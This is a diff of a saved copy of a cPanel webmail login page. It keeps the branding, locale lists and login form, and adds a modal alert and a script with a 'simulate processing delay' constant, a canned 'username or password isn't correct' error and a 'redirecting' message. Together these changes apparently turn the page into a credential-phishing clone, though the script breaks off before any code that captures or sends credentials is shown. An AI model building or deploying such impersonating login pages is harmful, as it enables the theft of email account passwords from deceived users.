@@ -1,144 +1,147 @@
 <!DOCTYPE html><html lang="en" dir="ltr" data-scrapbook-source="https://pmcbd.org:2096/" data-scrapbook-create="20250828060307494" data-scrapbook-title="Webmail Login"><head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
-    <meta name="google" content="notranslate">
-    <meta name="apple-itunes-app" content="app-id=1188352635">
-    <title>Webmail Login</title>
-    <link rel="shortcut icon" href="fb66ecdf2adf08682e5dd29ef3c531bd6eb68fa5.ico" type="image/x-icon">
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
+  <meta name="google" content="notranslate">
+  <meta name="apple-itunes-app" content="app-id=1188352635">
+  <title>Webmail Login</title>
+  <link rel="shortcut icon" href="fb66ecdf2adf08682e5dd29ef3c531bd6eb68fa5.ico" type="image/x-icon">
 
-    <!-- EXTERNAL CSS -->
-    <link href="open_sans.min.css" rel="stylesheet" type="text/css">
-    <link href="style_v2_optimized.css" rel="stylesheet" type="text/css">
+  <!-- EXTERNAL CSS -->
+  <link href="open_sans.min.css" rel="stylesheet" type="text/css">
+  <link href="style_v2_optimized.css" rel="stylesheet" type="text/css">
 
-    <style type="text/css">
+  <style type="text/css">
 /*
-  This css is included in the base template in case the css cannot be loaded because of access restrictions
-  If this css is updated, please update securitypolicy_header.html.tmpl as well
+This css is included in the base template in case the css cannot be loaded because of access restrictions
+If this css is updated, please update securitypolicy_header.html.tmpl as well
 */
 .copyright {
-  background: url("cb2dee89baaed072aaaecfb46bf4d2ffb6d4bd53.svg") no-repeat scroll center top transparent;
-  background-size: 25px auto;
+background: url("cb2dee89baaed072aaaecfb46bf4d2ffb6d4bd53.svg") no-repeat scroll center top transparent;
+background-size: 25px auto;
 }
 
 /* Language Selector Styles */
 .language-selector {
-  position: absolute;
-  top: 20px;
-  right: 20px;
-  z-index: 1000;
+position: absolute;
+top: 20px;
+right: 20px;
+z-index: 1000;
 }
 
 .language-selector select {
-  padding: 8px 12px;
-  border: 1px solid #ccc;
-  border-radius: 4px;
-  background: white;
-  font-size: 14px;
-  cursor: pointer;
-  outline: none;
+padding: 8px 12px;
+border: 1px solid #ccc;
+border-radius: 4px;
+background: white;
+font-size: 14px;
+cursor: pointer;
+outline: none;
 }
 
 .language-selector select:hover {
-  border-color: #0078d4;
+border-color: #0078d4;
 }
 
 .language-selector select:focus {
-  border-color: #0078d4;
-  box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
+border-color: #0078d4;
+box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
 }
 
 /* Error message styles */
 .error-message {
-  color: #d13438;
-  font-size: 14px;
-  margin-top: 8px;
-  text-align: center;
-  display: none;
+color: #d13438;
+font-size: 14px;
+margin-top: 8px;
+text-align: center;
+display: none;
 }
 
 .error-message.show {
-  display: block;
+display: block;
 }
 
 /* Loading state */
 .loading {
-  opacity: 0.7;
-  pointer-events: none;
+opacity: 0.7;
+pointer-events: none;
 }
 
 .loading .signinTxt {
-  color: #666;
+color: #666;
 }
 
 /* Modal styles */
 .modal-overlay {
-  position: fixed;
-  inset: 0;
-  background: rgba(0,0,0,0.45);
-  display: none;
-  align-items: center;
-  justify-content: center;
-  z-index: 9999;
+position: fixed;
+inset: 0;
+background: rgba(0,0,0,0.45);
+display: none;
+align-items: center;
+justify-content: center;
+z-index: 9999;
 }
 .modal {
-  width: 90%;
-  max-width: 420px;
-  background: #fff;
-  border-radius: 12px;
-  box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-  padding: 20px 20px 16px;
-  text-align: center;
+width: 90%;
+max-width: 420px;
+background: #fff;
+border-radius: 12px;
+box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+padding: 20px 20px 16px;
+text-align: center;
 }
 .modal-icon {
-  width: 48px;
-  height: 48px;
-  margin: 8px auto 12px;
-  border-radius: 50%;
-  display: inline-flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 28px;
+width: 48px;
+height: 48px;
+margin: 8px auto 12px;
+border-radius: 50%;
+display: inline-flex;
+align-items: center;
+justify-content: center;
+font-size: 28px;
 }
 .modal-icon.error { background: #fde7e9; color: #b01020; }
 .modal-icon.info { background: #e6f0fb; color: #0b5cab; }
 .modal-icon.success { background: #e7f6e7; color: #107c10; }
 .modal-title {
-  font-size: 18px;
-  font-weight: 600;
-  margin-bottom: 8px;
+font-size: 18px;
+font-weight: 600;
+margin-bottom: 8px;
 }
 .modal-message {
-  font-size: 14px;
-  color: #333;
-  line-height: 1.5;
-  margin-bottom: 16px;
+font-size: 14px;
+color: #333;
+line-height: 1.5;
+margin-bottom: 16px;
 }
 .modal-actions {
-  display: flex;
-  gap: 8px;
-  justify-content: center;
+display: flex;
+gap: 8px;
+justify-content: center;
 }
 .modal-button {
-  padding: 10px 16px;
-  border: 0;
-  border-radius: 6px;
-  background: #0078d4;
-  color: #fff;
-  font-size: 14px;
-  cursor: pointer;
+padding: 10px 16px;
+border: 0;
+border-radius: 6px;
+background: #0078d4;
+color: #fff;
+font-size: 14px;
+cursor: pointer;
 }
 .modal-button:hover { background: #066cbe; }
 .modal-button:active { transform: translateY(0.5px); }
-    </style>
-    <!--[if IE 6]>
-    <style type="text/css">
-        img {
-            behavior: url(/cPanel_magic_revision_1649699751/unprotected/cp_pngbehavior_login.htc);
-        }
-    </style>
-    <![endif]-->
 
-    
+/* Readonly input visual */
+.std_textbox[readonly] { background: #f5f5f5; cursor: not-allowed; }
+  </style>
+  <!--[if IE 6]>
+  <style type="text/css">
+      img {
+          behavior: url(/cPanel_magic_revision_1649699751/unprotected/cp_pngbehavior_login.htc);
+      }
+  </style>
+  <![endif]-->
+
+  
 </head>
 <body class="wm">
 
@@ -147,316 +150,316 @@
 <input type="hidden" id="goto_app" value="">
 <!-- Do not remove msg_code as it is needed for automated testing - msg_code:[]  -->
 <div id="login-wrapper" class="group ">
-    <div class="wrapper">
-    <div id="notify">
-        <noscript>
-            <div class="error-notice">
-                <img src="notice-error.png" alt="Error" align="left">
-                JavaScript is disabled in your browser.
-                For Webmail to function properly, you must enable JavaScript.
-                If you do not enable JavaScript, certain features in Webmail will not function correctly.
-            </div>
-            </noscript>
-        
-        
-        <div id="login-status" class="error-notice" style="visibility: hidden">
-            <div class="content-wrapper">
-                <div id="login-detail">
-                    <div id="login-status-icon-container"><span class="login-status-icon"></span></div>
-                    <div id="login-status-message">You have logged out.</div>
-                </div>
-            </div>
-        </div>
-        <div id="IE-warning" class="warn-notice IE-warning-hide" style="display: none">
-            <div class="content-wrapper">
-                <div id="IE-warning-detail">
-                    <div id="IE-warning-icon-container"><span class="IE-warning-icon"></span></div>
-                    <div id="IE-warning-message">The system has detected that you are using Internet Explorer 11. cPanel &amp; WHM no longer supports Internet Explorer 11. For more information, read the <a title="cPanel Blog" target="_blank" href="https://go.cpanel.net/ie11deprecation">cPanel Blog</a>.</div>
-                </div>
-            </div>
-        </div>
-    </div>
+  <div class="wrapper">
+  <div id="notify">
+      <noscript>
+          <div class="error-notice">
+              <img src="notice-error.png" alt="Error" align="left">
+              JavaScript is disabled in your browser.
+              For Webmail to function properly, you must enable JavaScript.
+              If you do not enable JavaScript, certain features in Webmail will not function correctly.
+          </div>
+          </noscript>
+      
+      
+      <div id="login-status" class="error-notice" style="visibility: hidden">
+          <div class="content-wrapper">
+              <div id="login-detail">
+                  <div id="login-status-icon-container"><span class="login-status-icon"></span></div>
+                  <div id="login-status-message">You have logged out.</div>
+              </div>
+          </div>
+      </div>
+      <div id="IE-warning" class="warn-notice IE-warning-hide" style="display: none">
+          <div class="content-wrapper">
+              <div id="IE-warning-detail">
+                  <div id="IE-warning-icon-container"><span class="IE-warning-icon"></span></div>
+                  <div id="IE-warning-message">The system has detected that you are using Internet Explorer 11. cPanel &amp; WHM no longer supports Internet Explorer 11. For more information, read the <a title="cPanel Blog" target="_blank" href="https://go.cpanel.net/ie11deprecation">cPanel Blog</a>.</div>
+              </div>
+          </div>
+      </div>
+  </div>
 
-    <div style="display:none">
-        <div id="locale-container" style="visibility:hidden">
-            <div id="locale-inner-container">
-                <div id="locale-header">
-                    <div class="locale-head">Please select a locale:</div>
-                    <div class="close"><a href="javascript:">X Close</a></div>
-                </div>
-                <div id="locale-map">
-                    <div class="scroller clear">
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=en">English</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=ar">العربية</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=cs">čeština</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=da">dansk</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=de">Deutsch</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=el">Ελληνικά</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=es">español</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=es_419">español latinoamericano</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=es_es">español de España</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=fi">suomi</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=fil">Filipino</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=fr">français</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=he">עברית</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=hu">magyar</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=i_en">i_en</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=id">Bahasa Indonesia</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=it">italiano</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=ja">日本語</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=ko">한국어</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=ms">Bahasa Melayu</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=nb">norsk bokmål</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=nl">Nederlands</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=pl">polski</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=pt">português</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=pt_br">português do Brasil</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=ro">română</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=ru">русский</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=sv">svenska</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=th">ไทย</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=tr">Türkçe</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=uk">українська</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=vi">Tiếng Việt</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=zh">中文</a></div>
-                        
-                            <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=zh_tw">中文（台湾）</a></div>
-                        
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <div id="content-container">
-        <div id="login-container">
+  <div style="display:none">
+      <div id="locale-container" style="visibility:hidden">
+          <div id="locale-inner-container">
+              <div id="locale-header">
+                  <div class="locale-head">Please select a locale:</div>
+                  <div class="close"><a href="javascript:">X Close</a></div>
+              </div>
+              <div id="locale-map">
+                  <div class="scroller clear">
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=en">English</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=ar">العربية</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=cs">čeština</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=da">dansk</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=de">Deutsch</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=el">Ελληνικά</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=es">español</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=es_419">español latinoamericano</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=es_es">español de España</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=fi">suomi</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=fil">Filipino</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=fr">français</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=he">עברית</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=hu">magyar</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=i_en">i_en</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=id">Bahasa Indonesia</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=it">italiano</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=ja">日本語</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=ko">한국어</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=ms">Bahasa Melayu</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=nb">norsk bokmål</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=nl">Nederlands</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=pl">polski</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=pt">português</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=pt_br">português do Brasil</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=ro">română</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=ru">русский</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=sv">svenska</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=th">ไทย</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=tr">Türkçe</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=uk">українська</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=vi">Tiếng Việt</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=zh">中文</a></div>
+                      
+                          <div class="locale-cell"><a href="https://pmcbd.org:2096/?locale=zh_tw">中文（台湾）</a></div>
+                      
+                  </div>
+              </div>
+          </div>
+      </div>
+  </div>
+  <div id="content-container">
+      <div id="login-container">
 
-            <div id="login-sub-container">
-                    <div id="login-sub-header">
-                        
-                        <img class="main-logo" src="webmail-logo.svg" alt="logo">
-                        
-                    </div>
-                    <div id="login-sub">
-                        <div id="clickthrough_form" style="visibility:hidden">
-                            <form action="javascript:">
-                                <div class="notices"></div>
-                                <button type="submit" class="clickthrough-cont-btn">Continue</button>
-                            </form>
-                        </div>
-                        <div id="forms">
-                            <form novalidate="" id="login_form" action="https://pmcbd.org:2096/login/" method="post" target="_top" style="visibility:">
-                                <div class="input-req-login"><label for="user">Email Address</label></div>
-                                <div class="input-field-login icon username-container">
-                                    <input name="user" id="user" autofocus="autofocus" value="" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
-                                </div>
-                                <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
-                                <div class="input-field-login icon password-container">
-                                    <input name="pass" id="pass" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required="">
-                                </div>
-                                <div class="controls">
-                                    <div class="login-btn">
-                                        <button name="login" type="submit" id="login_submit" tabindex="3">Log in</button>
-                                    </div>
+          <div id="login-sub-container">
+                  <div id="login-sub-header">
+                      
+                      <img class="main-logo" src="webmail-logo.svg" alt="logo">
+                      
+                  </div>
+                  <div id="login-sub">
+                      <div id="clickthrough_form" style="visibility:hidden">
+                          <form action="javascript:">
+                              <div class="notices"></div>
+                              <button type="submit" class="clickthrough-cont-btn">Continue</button>
+                          </form>
+                      </div>
+                      <div id="forms">
+                          <form novalidate="" id="login_form" action="https://pmcbd.org:2096/login/" method="post" target="_top" style="visibility:">
+                              <div class="input-req-login"><label for="user">Email Address</label></div>
+                              <div class="input-field-login icon username-container">
+                                  <input name="user" id="user" autofocus="autofocus" value="" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
+                              </div>
+                              <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
+                              <div class="input-field-login icon password-container">
+                                  <input name="pass" id="pass" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required="">
+                              </div>
+                              <div class="controls">
+                                  <div class="login-btn">
+                                      <button name="login" type="submit" id="login_submit" tabindex="3">Log in</button>
+                                  </div>
 
-                                                                    </div>
-                                <div class="clear" id="push"></div>
-                            </form>
-                            
-                            <!-- Error Message Display -->
-                            <div id="errorMessage" class="error-message"></div>
-                            
-                        <!--CLOSE forms -->
-                        </div>
-                    <!--CLOSE login-sub -->
-                    </div>
-                    
+                                                                  </div>
+                              <div class="clear" id="push"></div>
+                          </form>
+                          
+                          <!-- Error Message Display -->
+                          <div id="errorMessage" class="error-message"></div>
+                          
+                      <!--CLOSE forms -->
+                      </div>
+                  <!--CLOSE login-sub -->
+                  </div>
+                  
 
-                                    <!--CLOSE wrapper -->
-                </div>
-            <!--CLOSE login-sub-container -->
-            </div>
-        <!--CLOSE login-container -->
-        </div>
-        
-                <div id="locale-footer">
-            <div class="locale-container">
-                <noscript>
-                    <form method="get" action="javascript:void(0);">
-                        <select name="locale" onchange="handleLocaleChange(this.value)">
-                            <option value="" selected="">Change locale</option>
-                            <option value="en">English</option><option value="ar">العربية</option><option value="cs">čeština</option><option value="da">dansk</option><option value="de">Deutsch</option><option value="el">Ελληνικά</option><option value="es">español</option><option value="es_419">español latinoamericano</option><option value="es_es">español de España</option><option value="fi">suomi</option><option value="fil">Filipino</option><option value="fr">français</option><option value="he">עברית</option><option value="hu">magyar</option><option value="i_en">i_en</option><option value="id">Bahasa Indonesia</option><option value="it">italiano</option><option value="ja">日本語</option><option value="ko">한국어</option><option value="ms">Bahasa Melayu</option><option value="nb">norsk bokmål</option><option value="nl">Nederlands</option><option value="pl">polski</option><option value="pt">português</option><option value="pt_br">português do Brasil</option><option value="ro">română</option><option value="ru">русский</option><option value="sv">svenska</option><option value="th">ไทย</option><option value="tr">Türkçe</option><option value="uk">українська</option><option value="vi">Tiếng Việt</option><option value="zh">中文</option><option value="zh_tw">中文（台湾）</option>                        </select>
-                        <button style="margin-left: 10px" type="button" onclick="handleLocaleChange(document.querySelector('select[name=locale]').value)">Change</button>
-                    </form>
-                    <style type="text/css">#mobilelocalemenu, #locales_list {display:none}</style>
-                </noscript>
-                <ul id="locales_list">
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('en')">English</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('ar')">العربية</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('cs')">čeština</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('da')">dansk</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('de')">Deutsch</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('el')">Ελληνικά</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('es')">español</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('es_419')">español&nbsp;latinoamericano</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('es_es')">español de España</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('fi')">suomi</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('fil')">Filipino</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('fr')">français</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('he')">עברית</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('hu')">magyar</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('i_en')">i_en</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('id')">Bahasa Indonesia</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('it')">italiano</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('ja')">日本語</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('ko')">한국어</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('ms')">Bahasa Melayu</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('nb')">norsk bokmål</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('nl')">Nederlands</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('pl')">polski</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('pt')">português</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('pt_br')">português do Brasil</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('ro')">română</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('ru')">русский</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('sv')">svenska</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('th')">ไทย</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('tr')">Türkçe</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('uk')">українська</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('vi')">Tiếng Việt</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('zh')">中文</a></li>
-                    
-                        
-                        <li><a href="javascript:handleLocaleChange('zh_tw')">中文（台湾）</a></li>
-                    
-                </ul>
-                <div id="mobilelocalemenu">Select a locale:
-                    <a href="javascript:handleLocaleChange('en')" title="Change locale">English</a>
-                </div>
-            </div>
-        </div>
-    </div>
+                                  <!--CLOSE wrapper -->
+              </div>
+          <!--CLOSE login-sub-container -->
+          </div>
+      <!--CLOSE login-container -->
+      </div>
+      
+              <div id="locale-footer">
+          <div class="locale-container">
+              <noscript>
+                  <form method="get" action="javascript:void(0);">
+                      <select name="locale" onchange="handleLocaleChange(this.value)">
+                          <option value="" selected="">Change locale</option>
+                          <option value="en">English</option><option value="ar">العربية</option><option value="cs">čeština</option><option value="da">dansk</option><option value="de">Deutsch</option><option value="el">Ελληνικά</option><option value="es">español</option><option value="es_419">español latinoamericano</option><option value="es_es">español de España</option><option value="fi">suomi</option><option value="fil">Filipino</option><option value="fr">français</option><option value="he">עברית</option><option value="hu">magyar</option><option value="i_en">i_en</option><option value="id">Bahasa Indonesia</option><option value="it">italiano</option><option value="ja">日本語</option><option value="ko">한국어</option><option value="ms">Bahasa Melayu</option><option value="nb">norsk bokmål</option><option value="nl">Nederlands</option><option value="pl">polski</option><option value="pt">português</option><option value="pt_br">português do Brasil</option><option value="ro">română</option><option value="ru">русский</option><option value="sv">svenska</option><option value="th">ไทย</option><option value="tr">Türkçe</option><option value="uk">українська</option><option value="vi">Tiếng Việt</option><option value="zh">中文</option><option value="zh_tw">中文（台湾）</option>                        </select>
+                      <button style="margin-left: 10px" type="button" onclick="handleLocaleChange(document.querySelector('select[name=locale]').value)">Change</button>
+                  </form>
+                  <style type="text/css">#mobilelocalemenu, #locales_list {display:none}</style>
+              </noscript>
+              <ul id="locales_list">
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('en')">English</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('ar')">العربية</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('cs')">čeština</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('da')">dansk</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('de')">Deutsch</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('el')">Ελληνικά</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('es')">español</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('es_419')">español&nbsp;latinoamericano</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('es_es')">español de España</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('fi')">suomi</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('fil')">Filipino</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('fr')">français</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('he')">עברית</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('hu')">magyar</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('i_en')">i_en</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('id')">Bahasa Indonesia</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('it')">italiano</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('ja')">日本語</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('ko')">한국어</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('ms')">Bahasa Melayu</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('nb')">norsk bokmål</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('nl')">Nederlands</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('pl')">polski</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('pt')">português</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('pt_br')">português do Brasil</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('ro')">română</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('ru')">русский</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('sv')">svenska</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('th')">ไทย</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('tr')">Türkçe</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('uk')">українська</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('vi')">Tiếng Việt</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('zh')">中文</a></li>
+                  
+                      
+                      <li><a href="javascript:handleLocaleChange('zh_tw')">中文（台湾）</a></li>
+                  
+              </ul>
+              <div id="mobilelocalemenu">Select a locale:
+                  <a href="javascript:handleLocaleChange('en')" title="Change locale">English</a>
+              </div>
+          </div>
+      </div>
+  </div>
 <!--Close login-wrapper -->
 </div>
 
 
 <style>
-    @media (min-width: 481px) {
-        #select_user_form {
-            width: px;
-        }
-    }
+  @media (min-width: 481px) {
+      #select_user_form {
+          width: px;
+      }
+  }
 </style>
-    <div class="copyright">Copyright©&nbsp;2025 cPanel, L.L.C.
-    <br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a></div>
+  <div class="copyright">Copyright©&nbsp;2025 cPanel, L.L.C.
+  <br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a></div>
 
 <!-- Modal Alert -->
 <div id="modalOverlay" class="modal-overlay" role="dialog" aria-modal="true" aria-hidden="true">
-  <div class="modal">
-    <div id="modalIcon" class="modal-icon error" aria-hidden="true">!</div>
-    <div id="modalTitle" class="modal-title">Alert</div>
-    <div id="modalMessage" class="modal-message"></div>
-    <div class="modal-actions">
-      <button id="modalOk" class="modal-button">OK</button>
-    </div>
+<div class="modal">
+  <div id="modalIcon" class="modal-icon error" aria-hidden="true">!</div>
+  <div id="modalTitle" class="modal-title">Alert</div>
+  <div id="modalMessage" class="modal-message"></div>
+  <div class="modal-actions">
+    <button id="modalOk" class="modal-button">OK</button>
   </div>
+</div>
 </div>
 
 <!-- JavaScript for Language Translation and Form Handling -->
@@ -469,699 +472,699 @@ const DELAY_SECONDS = 2; // Simulate processing delay
 
 // Language translations
 const translations = {
-  en: {
-    title: "Webmail Login",
-    emailLabel: "Email Address",
-    emailPlaceholder: "Enter your email address.",
-    passwordLabel: "Password",
-    passwordPlaceholder: "Enter your email password.",
-    loginButton: "Log in",
-    signingIn: "Signing in...",
-    errorEmailPassword: "Please enter your email address and password.",
-    errorInvalidCredentials: "The username or password you entered isn't correct. Try entering it again.",
-    loginSuccess: "Login successful, redirecting...",
-    copyright: "Copyright© 2025 cPanel, L.L.C.",
-    privacyPolicy: "Privacy Policy",
-    localeChange: "Change locale",
-    moreLocales: "More locales",
